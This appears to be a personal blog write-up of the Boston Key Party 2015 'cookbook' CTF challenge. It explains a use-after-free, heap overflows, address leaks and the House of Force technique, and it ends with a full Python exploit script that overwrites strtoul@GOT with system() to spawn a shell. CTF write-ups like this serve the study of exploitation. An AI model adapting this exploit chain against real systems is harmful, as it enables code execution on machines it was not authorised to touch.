---
layout: post
title: Boston Key Party CTF 2015 - Cookbook
---


This is an old writeup I wrote for myself but never published for **cookbook** which was a **binary exploitation** challenge in **Boston Key Party CTF 2015** 

## Vulnerabilities
There are several vulnerabilities in this program. First, there is a use-after-free vulnerability.

{% highlight C %}
    switch ( s[0] )
    {
      case 'n':
        cur_recipe = calloc(1u, 0x40Cu);
        continue;
      case 'd':
        free(cur_recipe);
        continue;
{% endhighlight %}

`cur_recipe` is not set to NULL after the object is freed.
This leads to unexpected system behavior when the user deletes/frees their recipe and later prints out information that references the same pointer.
In this case, if the user also adds an ingredient to the recipe, it allows the user to leak the address of a heap chunk, which can then be used the calculate the base address of the heap.

{% highlight C %}
      case 'p':
        if ( cur_recipe )
          get_recipe_info((int)cur_recipe);
        continue;
{% endhighlight %}

There are also several heap overflow vulnerabilities that exist in the program.

{% highlight C %}
      case 'g':
        if ( cur_recipe )
          fgets((char *)cur_recipe + 0x8C, 0x40C, stdin);// overflow!
        else
          puts("can't do it on a null guy");
        continue;
      case 'i':
        if ( cur_recipe )
          fgets((char *)cur_recipe + 0x8C, 0x40C, stdin);// overflow!
          s[strcspn(s, "\n")] = 0;
        else
          puts("can't do it on a null guy");
        continue;
{% endhighlight %}

`cur_recipe` is calloc()'d with size `0x40C` when a new recipe is created.
When a name is give to this recipe, `fgets()` accepts `0x40C` of user input, but it is written to offset `0x8C` into the `cur_recipe` buffer, allowing the user to overflow into the next heap chunk.

I also found a couple double free() vulnerabilities but those are not really pertinent to the exploit I ended up writing so I will not mention those.

## Infoleaks
Essentially, what I ended up doing was I used the UAF vulnerabilities to defeat ASLR and leak the address of the heap chunk as well as the address of a libc function in the global offset table (GOT).

I did the former to calculate the base address of the heap as well as the address of the wilderness chunk, and I did the latter to calculate the base address of libc which allowed me to calculate the addresses of all the other functions in libc, including `system()`. 
I was also able to leverage the first leak to determine the address of the ingredient struct which I used to craft a "fake" chunk, which I requested `0x40C` bytes for. 
By requesting a heap chunk of size `0x40C` bytes, I was able to allocate the same chunk of memory that got freed, to this "fake" chunk because memory allocators are deterministic in the way they allocate chunks of memory: If a chunk of around the same requested size is free/available, the memory allocator will return a pointer to that free chunk. 
The first DWORD in this "fake" chunk's data is a pointer to 8 bytes ahead of where the "fake" chunk data starts. In turn, this DWORD contains a pointer to the address of `puts()` in the GOT. The reason being, I wanted to leak out the actual address of `puts()` later when I would print out the recipe. In between these two DWORDS I just placed the same pointer that was in the original recipe, which pointed to the number of the specified ingredient to be used. Without it, the program kept segfault-ing.


previously freed chunk that has just been overwritten w/a "fake" chunk:
{%highlight text%}
0x0804f2bo: |    0x0804f2b8    |    0x0804f6d0    |    0x0804d030    |
                 ^ptr to ptr        ^original ptr      ^addr of puts@got
{%endhighlight%}

After crafting this fake chunk, I simply had to go back to the `create recipe` menu and print out the recipe to leak out the address of `puts()`.

## House-of-Force

For the second stage of this exploit I used the House of Force heap exploitation technique detailed in [Malloc Maleficarum](http://seclists.org/bugtraq/2005/Oct/118) to gain a write-what-where primitive and eventually spawn a shell.
This technique requries 3 memory allocations:

**1) must be able to overflow into the wilderness chunk with a `malloc()` to corrupt its size field**

**2) must be able to specify the size of this second `malloc()`**

**3) must be able to copy data into the 3rd `malloc()`'d chunk**

First, I leveraged the heap overflow vulnerability to corrupt the wilderness chunk.
I created a new recipe in order to allocate a new heap chunk next to the wilderness chunk.
I then gave the new recipe a name that was long enough to overwrite the `size` field of the wilderness chunk with `0xffffffff`, or `-1`.
When the size of the wilderness chunk is `-1`, it tricks the memory allocator into never thinking that it is low on memory, allowing the user to continue to allocate more chunks on the heap, even if they extend past the allocated area for the heap arena, and into other segments of the process's virtual address space.

Then, I went back to the main menu and gave my cookbook a name of a size I calculated would bring me to precisely 8 bytes before the address I wanted to overwrite. 
In my exploit, I chose to overwrite the pointer stored in `strtoul@GOT` and replace it with the address of `system()`.
`Strtoul` was an ideal candidate to be overwritten because the program pushed user controlled input onto the stack before calling it, and the second argument passed in was 0.

For my third `malloc()`, I simply gave my cookbook another new name of 5 bytes and set the name to be the calculated address of `system()` in libc.

Finally, I gave my cookbook another name and set the size to be `"/bin/sh\n"` to gain a shell.

## Solution

{% highlight python %}
#!/usr/bin/python
import os, sys, socket
import struct
import telnetlib

PUTS_GOT = 0x0804d030
STRTOUL_GOT = 0x0804d038
PUTS_OFFSET = 0x65650
SYSTEM_OFFSET = 0x40190
WILDERNESS_OFFSET = 0x1af0 # distance from heap base addr to wilderness chunk DATA addr

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect(('cookbook.bostonkey.party',5000))
    s.connect(('127.0.0.1', 1337))
    f = s.makefile('w', bufsize=0)
    return s, f

def readuntil(f, delim='[q]uit\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def interact():
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

s, f = conn()

print "[+] STAGE 1"
payload  = 'AAAA\n'
readuntil(f, "what's your name?")
f.write(payload)
readuntil(f)
f.write("c\n")
readuntil(f)
f.write("n\n")
readuntil(f)
f.write("g\n")

# UAF to leak heap chunk addr
f.write("A"*4+"\n")
readuntil(f)
f.write("a\n") # note: adding an ingredient calloc()'s two chunks on top of recipe chunk
readuntil(f, "?")
f.write("basil\n")
readuntil(f, "?")
f.write("1\n") # set to 1 so that the address of puts() can be leaked later via the "total cals" since program multiplies cals per ingredient by number of ingred in recipe to get total
readuntil(f)
f.write("d\n")
readuntil(f)
f.write("p\n")
leaked_chunk = hex(int(readuntil(f," - ").split('\n')[4].split(' ')[0]))
heap_base = hex(int(leaked_chunk,16)-0x16d8)   
print "[*] leaked heap chunk found at address "+str(leaked_chunk)
print "[*] calculated heap base found at address "+str(heap_base)

leaked_recipe = hex(int(leaked_chunk,16)-0x6d8+0x2b0)
leaked_recipe_offset_8 = int(leaked_recipe,16)+0x8
leaked_recipe_ingred_num = int(leaked_chunk,16)-0x8

# UAF to allocate another chunk of the same size as recipe (0x40c) to replace previously freed recipe chunk
# leak puts() addr
readuntil(f)
f.write("q\n")
readuntil(f)
f.write("g\n")
readuntil(f, ":")
f.write("40c\n") # size of recipe chunk
# overwrite the previous ingredient ptr(offset + 0x0) and the previous ingredient size ptr(offset + 0x4). craft pointer to puts@GOT on (offset + 0x8) 
f.write(p(leaked_recipe_offset_8)+p(leaked_recipe_ingred_num)+p(PUTS_GOT)+"\x00"*(0x40c-0x4-0x4-0x4)+"\n")
readuntil(f)
f.write("c\n")
readuntil(f,"[n]")
f.write("p\n")
puts_addr = hex(int(readuntil(f,"[n]").split('\n')[14].split(' ')[3]))
libc_base = hex(int(puts_addr,16)-PUTS_OFFSET)
system_addr = int(libc_base,16)+SYSTEM_OFFSET
print "[*] leaked puts() found at address "+str(puts_addr)
print "[*] calculated libc_base addr at address "+str(libc_base)
print "[*] calculated system() found at address "+str(hex(system_addr))

# house of force heap exploit technique
'''
https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/
https://sploitfun.wordpress.com/2015/03/04/heap-overflow-using-malloc-maleficarum/
'''
print ""
print "[+] STAGE 2"
wilderness_addr=int(heap_base,16)+WILDERNESS_OFFSET
print "[*] calculated wilderness chunk found at address "+str(hex(wilderness_addr))
readuntil(f)
f.write("n\n") # 1st HOF malloc() to create a new heap chunk next to wilderness chunk + overflow to corrupt wilderness chunk size
readuntil(f)
print "[*] overwriting wilderness chunk size w/0xffffffff" # so that mmap() is not called in order to extend the heap
f.write("g\n")
f.write("A"*(1036-0x8c)+"\xff"*4+"\n") # overwrite wilderness chunk size w/ "0xffffffff"
readuntil(f)
f.write("q\n")
readuntil(f)

# main_menu
hof_size_2 = format((STRTOUL_GOT-8-(wilderness_addr))&0xffffffff,'x')
print "[*] allocating second HOF chunk with size "+str(hex(int(hof_size_2,16)))

f.write("g\n")
readuntil(f, ":")
f.write(hof_size_2+"\n") # specify size of 2nd HOF malloc() to be `GOT_entry - 8 byte - addr of top chunk`
readuntil(f)

# main_menu
print "[*] overwriting strtoul@GOT with system()"
f.write("g\n") # 3rd HOF malloc() chunk overwrites PUTS_GOT
readuntil(f, ":")
f.write("5\n") # size of last chunk. 4 byte addr + 1 byte newline char
f.write(p(system_addr)+"\n")
readuntil(f)

# call strtoul() and push '/bin/sh' onto stack
f.write("g\n")
readuntil(f, ":")
f.write("/bin/sh\n")

print ""
print "[+] OPENING SHELL..."

interact()

f.close()
s.close()
{% endhighlight %}
